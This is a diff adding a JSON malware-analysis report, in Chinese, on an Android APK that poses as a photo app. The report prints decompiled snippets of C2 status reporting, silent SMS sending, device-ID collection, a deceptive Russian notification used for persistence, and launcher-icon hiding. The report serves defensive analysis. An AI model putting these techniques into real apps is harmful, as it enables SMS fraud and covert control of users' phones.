@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "4dfc360fdb55e74f7108daefb7e5becc6790510854bba92e83e1eddc2f16e86b.apk",
+    "sha256": "4dfc360fdb55e74f7108daefb7e5becc6790510854bba92e83e1eddc2f16e86b",
+    "包名": "ru.vat.escape",
+    "应用名": "ММC - Фото",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 124.6
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vat\\escape\\Difference;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new b(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class Difference extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new b(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "BroadcastReceiver 接收包含命令控制参数的 Intent，从中提取 id、command、post、status 等字段，通过 b 类构建 HTTP POST 请求将这些命令执行状态信息上报至远程 C2 服务器，实现命令分发与执行结果回传的 C2 通信闭环。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vat\\escape\\a;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n          try {\n              ChiefAbortion.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码(str)和短信内容(str2)均由外部参数传入，无用户交互确认。异常被空catch块静默吞没，结合该样本已确认为恶意软件，此行为典型用于短信欺诈（扣费订阅）或向C2回传窃取数据。ChiefAbortion.a(true)可能用于设置某种运行标志以配合恶意流程。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vat\\escape\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static void c(Context context, long j) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString() 读取设备的 android_id（设备唯一标识符），属于设备指纹采集行为。采集到的标识符通过函数返回值传递给调用方，可能用于设备追踪或后续上传至C2服务器。android_id 相对 IMEI/IMSI 敏感度较低，但在恶意样本上下文中通常用于设备标识与追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vat\\escape\\GloveAccent;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.getClass().getMethod(\"createNotificationChannel\", NotificationChannel.class).invoke(this.a, new NotificationChannel(\"ru.vat.escape.PASS\", \"Ice\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"ru.vat.escape.PASS\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocнoвнoй процесc\").setContentText(\"Cистeма не кoрректнo рабoтаeт...\");\nstartForeground(444, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"ru.vat.escape.PASS\", \"Ice\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.vat.escape.PASS\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Ocнoвнoй процесc\").setContentText(\"Cистeма не кoрректнo рабoтаeт, вам нeoбхoдимо включить дocтуп к cтатиcтикe для 'Ocнoвнoй процесc'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(444, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "代码通过startForeground启动前台服务实现进程保活，防止恶意服务被系统杀死。通知内容使用欺骗性俄语文本（声称'系统工作不正常，需要启用统计访问权限'），利用社会工程手段诱导用户授予额外权限。前台服务保活使恶意进程持续在后台运行，维持恶意功能的持久性。数据流向：系统API startForeground()→前台服务保活，欺骗性通知→用户被诱导授予权限。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\vat\\escape\\DeserveStubborn;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) DeserveStubborn.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class DeserveStubborn extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) DeserveStubborn.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该代码在 Activity 的 onCreate 中调用 setComponentEnabledSetting 将自身组件状态设置为 COMPONENT_ENABLED_STATE_DISABLED(值为2)，使应用图标从启动器中隐藏。隐藏后用户无法在桌面看到应用图标，但应用仍可通过后台服务、广播等方式继续运行恶意逻辑。数据流向：getApplicationContext() 获取上下文 → setComponentEnabledSetting() 禁用主组件导致图标隐藏。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
